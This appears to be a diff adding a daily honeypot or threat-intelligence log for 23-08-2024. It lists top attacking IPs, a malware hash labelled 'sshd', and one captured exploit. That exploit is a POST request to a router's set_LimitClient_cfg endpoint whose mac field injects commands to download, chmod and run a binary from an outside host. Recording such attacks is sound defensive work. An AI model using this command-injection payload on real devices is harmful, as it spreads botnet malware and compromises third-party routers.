@@ -1,0 +1,22 @@
+Top 5 IPs for 23-08-2024 :
+
+178.128.10.123
+120.50.8.56
+45.147.251.229
+59.95.86.118
+64.227.44.14
+
+
+Malware Observed:
+
+File Name : sshd
+94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+https://www.virustotal.com/gui/file/94f2e4d8d4436874785cd14e6e6d403507b8750852f7f2040352069a75da4c00
+
+
+Commands/exploits observed
+
+POST /goform/set_LimitClient_cfg HTTP/1.1
+Cookie: user=admin
+
+time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf *mpsl*;wget http://103.178.235.32/huhu.mpsl; chmod 777 huhu.mpsl; ./huhu.mpsl lblink.selfrep;rm -rf *mpsl*;
